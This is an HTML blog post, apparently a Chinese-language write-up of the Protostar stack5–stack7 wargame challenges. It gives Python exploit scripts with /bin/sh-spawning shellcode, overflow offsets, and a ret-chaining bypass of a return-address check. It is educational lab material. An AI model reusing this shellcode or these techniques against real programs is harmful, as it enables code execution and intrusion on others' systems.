@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="Protostar Stack Still Easy"/>
+
+
+
+
+  <meta name="keywords" content="pwn, stack overflow, Znight" />
+
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Znight">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.5.0" />
+
+
+
+<link rel="canonical" href="http://znight.sight/2017/09/08/protostar-stack-still-easy/"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.5.0" />
+
+
+
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+    <title> Protostar Stack Still Easy - Znight </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Znight</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/tags/">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            Categories
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Znight</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            
+            
+              Home
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              Archives
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            
+            
+              Tags
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              Categories
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Protostar Stack Still Easy
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017-09-08
+        </span>
+        
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack5"><span class="toc-text">stack5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack6"><span class="toc-text">stack6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack7"><span class="toc-text">stack7</span></a></li></ol>
+    </div>
+  </div>
+
+
+    <div class="post-content">
+      
+        <p>接上次protostar stack easy, 这篇文章是<code>stack5</code>-<code>stack7</code>的write-up, 因为给汇编代码写注释太费时间, 我就直接上源码了.<br><a id="more"></a></p>
+<h2 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h2><p>将shellcode写到栈上, 然后JMP到shellcode的起始地址. ‘0x90’是<code>NOP</code>指令的机器码, 加入适当的’0x90’是提高JMP进shellcode的几率, 在这个题目中加或不加都没有关系, 因为没有开启<code>ASLR</code>. 这种技巧在<code>heap spray</code>中也会用到.</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">sc = <span class="string">'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'</span></div><div class="line"></div><div class="line">payroad = <span class="string">''</span></div><div class="line">payroad += <span class="string">'A'</span> * <span class="number">0x4c</span></div><div class="line">payroad += <span class="string">'\xb0\xfc\xff\xbf'</span></div><div class="line"><span class="comment">#payroad += '\x90' * 0x20</span></div><div class="line">payroad += sc</div><div class="line"></div><div class="line"><span class="keyword">print</span> payroad</div></pre></td></tr></table></figure>
+<h2 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h2><p>先看源码中的这几句 :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ret = __builtin_return_address(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</div><div class="line">    _exit(<span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>__builtin_return_address</code>函数返回当前函数或调用当前函数的指令的返回地址. 参数为0表示返回当前函数的地址. if语句限制了返回地址第一个字节不能等于<code>0xbf</code>, 也就是说, 返回地址不能在栈上.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) info proc mappings</div><div class="line">process 4407</div><div class="line">cmdline = &apos;/opt/protostar/bin/stack6&apos;</div><div class="line">cwd = &apos;/opt/protostar/bin&apos;</div><div class="line">exe = &apos;/opt/protostar/bin/stack6&apos;</div><div class="line">Mapped address spaces:</div><div class="line"></div><div class="line">	Start Addr   End Addr       Size     Offset objfile</div><div class="line">	... ...</div><div class="line">	0xbffeb000 0xc0000000    0x15000          0           [stack]</div></pre></td></tr></table></figure></p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>这道题目可以用<code>ret2libc</code>做, 但是这里我们用另外一种方法.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">sc = <span class="string">'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'</span></div><div class="line">retaddr = <span class="string">'\xf9\x84\x04\x08'</span>    <span class="comment"># ret</span></div><div class="line"></div><div class="line">payroad = <span class="string">''</span></div><div class="line">payroad += <span class="string">'A'</span> * <span class="number">0x50</span></div><div class="line">payroad += retaddr</div><div class="line">payroad += <span class="string">'\x94\xfc\xff\xbf'</span></div><div class="line"><span class="comment">#payroad += '\x90' * 0x20</span></div><div class="line">payroad += sc</div><div class="line"></div><div class="line"><span class="keyword">print</span> payroad</div></pre></td></tr></table></figure></p>
+<p>这里我们通过ret两次来绕过检查, 第一次返回到ret指令, 第二次返回到shellcode首地址.</p>
+<h2 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h2><p>先看源码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ret = __builtin_return_address(<span class="number">0</span>);</div><div class="line"></div><div class="line"> <span class="keyword">if</span>((ret &amp; <span class="number">0xb0000000</span>) == <span class="number">0xb0000000</span>) &#123;</div><div class="line">     <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</div><div class="line">     _exit(<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</div><div class="line"> <span class="keyword">return</span> strdup(buffer);</div></pre></td></tr></table></figure></p>
+<p>参照stack6, 前两句限制了ret2libc和直接JMP shellcode. 我们仍然可以用返回到.text段的方法. 这里有一点很奇怪, 当我在gdb里面调试的时候是能够成功getshell的, 但是直接执行程序的时候会报错<code>Illegal instruction</code>.<br>这里可能的原因是gdb中调试的地址和实际运行的地址不同.具体参照<a href="https://www.mattandreko.com/2011/12/17/exploit-exercises-protostar-stack-5/" target="_blank" rel="external">Here</a>, 可以通过生成core文件来查看地址.<br>这道题特殊的解法是JMP register, 因为strdup返回的地址被保存在eax中, 我们也可以利用这一点来JMP到shellcode, 具体实现见<a href="https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/07-Stack7.md" target="_blank" rel="external">Here</a>.</p>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/pwn/">pwn</a>
+            
+              <a href="/tags/soverflow/">stack overflow</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2017/09/05/Debug-Shellcode/">
+        <span class="next-text nav-default">Debug Shellcode</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:leeeric053@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="http://github.com/Leeericent" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+    
+    2017
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Lericent Lee</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.5.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.5.0"></script>
+
+  </body>
+</html>
